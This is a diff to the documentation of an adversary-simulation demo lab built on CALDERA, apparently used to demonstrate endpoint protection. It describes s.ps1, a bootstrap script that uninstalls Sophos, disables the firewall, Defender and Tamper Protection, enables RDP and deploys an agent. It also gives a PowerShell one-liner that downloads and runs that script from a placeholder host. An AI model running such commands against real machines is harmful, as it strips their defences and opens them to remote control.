@@ -153,7 +153,7 @@ adversary-sim/
 |       +-- caldera-library.json    <- CALDERA ability/adversary index for n8n AI prompts
 |       +-- mitre-attack.json       <- ATT&CK Enterprise techniques for autocomplete
 |       +-- shared.css              <- Shared design system (fonts, colors, components) imported by all pages
-|       +-- s.ps1                   <- One-liner sandcat bootstrap for Windows victims
+|       +-- s.ps1                   <- One-liner sandcat bootstrap for Windows victims. Steps: (1) uninstall Sophos if present, (2) enable RDP if disabled, (3) disable Windows Firewall, (4) disable Tamper Protection + Defender, (5) deploy sandcat agent, (6) auto-generate demo wallpaper via .NET System.Drawing (auto-detects Sophos → navy/cyan "SOPHOS PROTECTED" or navy/orange "UNPROTECTED ENDPOINT", shows hostname/IP/OS). NOT gitignored — nginx sub_filter injects CALDERA_HOST at serve time.
 |
 +-- caldera/
 |   +-- conf/local.yml              <- CALDERA configuration: API keys, users, plugins
@@ -351,7 +351,7 @@ One-liner for victim (served by nginx at `/s.ps1`):
 powershell -c "iex(iwr 'http://<host>:8081/s.ps1' -UseBasicParsing)"
 ```
 
-Note: `s.ps1` currently has a hardcoded IP for the CALDERA server. Update it to match your Docker host address before deploying to victims.
+Note: `s.ps1` uses `CALDERA_HOST` as a placeholder. nginx `sub_filter` replaces it with `$host` at serve time — no manual editing needed. The file is tracked in git (not gitignored).
 
 ### Adversary Profile IDs
 
@@ -595,6 +595,7 @@ All write workflows write to `/data/scenarios/scenarios.json` using `require('fs
   - `rh_stage_dive` — shows/hides `#nav-stage-dive` + `#dd-stage-dive` (opens Stage Dive overlay)
   - Both default to hidden (`null` = off). No server-side persistence.
 - **Stage Dive overlay** (`#stage-dive-overlay` in index.html): Full-screen overlay, blue gradient background, off-white text and border, vertically centered card. Textarea for plain-English attack description → POST `/api/scenario-build` → displays MITRE techniques + expected detections. Does NOT auto-launch a CALDERA operation — SE finds the scenario in the console list and launches manually.
+- **stagedive.html**: Full-screen 3-slide presentation mode. Slide 1: attacker feed. Slide 2: unmanaged victim RDP. Slide 3: split view (attacker feed left, protected VM RDP right). RDP is implemented with **guacamole-common-js** (`/guacamole/guacamole-common-js/all.js`) — NOT an Angular iframe. Uses `Guacamole.WebSocketTunnel` + `Guacamole.Client` directly for full display scale control (`client.getDisplay().scale()`). Mouse: native container event listeners with `getBoundingClientRect()` ÷ `displayScale` for coordinate mapping. Keyboard: single `Guacamole.Keyboard(document)` at module level, routed to active panel via `mouseenter`/`mouseleave`. Retries up to 3× on tunnel errors (8s delay) and always evicts `guacToken` before retry.
 - **Beta button styling**: `.beta-btn` class — dim purple border `rgba(180,60,255,0.3)`, color `#c060f0`. Applied to both main nav and hamburger dropdown items.
 
 ### Scenario Studio (admin.html)
@@ -801,4 +802,4 @@ The detection result is cached in `.labops-mode` (gitignored). To force re-detec
 
 ---
 
-*Last updated: 2026-03-22 — Nav redesign: "Lab Manager" moved to bottom of Platform section, separated by .nav-sep, styled with .nav-it-switch class (cyan, →) to signal product switch. shared.css gains .nav-it-switch + .nav-it-switch:hover styles. Previous: 2026-03-21 — The Rabbit Hole: added lab.html (hidden beta lab with feature toggles and roadmap), 🐇 v2.1 easter egg trigger in index.html header, Booth Duty + Stage Dive localStorage-gated beta nav buttons, Stage Dive full-screen overlay. Previous: 2026-03-18 — Brand unification: Orbitron wordmark applied to all pages; shared.css .wm-* classes; Scenario Studio; architecture.html single scrollable page; Kali + Atomic optional.*
+*Last updated: 2026-03-23 — Stage Dive: full guacamole-common-js RDP integration (mouse, keyboard, auto-scale, 3× retry), VM demo wallpaper auto-generated in s.ps1 (auto-detects Sophos, renders hostname/IP/OS via .NET System.Drawing), s.ps1 removed from .gitignore (nginx sub_filter handles CALDERA_HOST), safe RDP enablement in s.ps1 (only touches TermService if actually disabled). Previous: 2026-03-22 — Nav redesign: "Lab Manager" moved to bottom of Platform section, separated by .nav-sep, styled with .nav-it-switch class (cyan, →) to signal product switch. Previous: 2026-03-21 — The Rabbit Hole: added lab.html, 🐇 v2.1 easter egg, Stage Dive overlay. Previous: 2026-03-18 — Brand unification: Orbitron wordmark, shared.css .wm-* classes, Scenario Studio, architecture.html.*
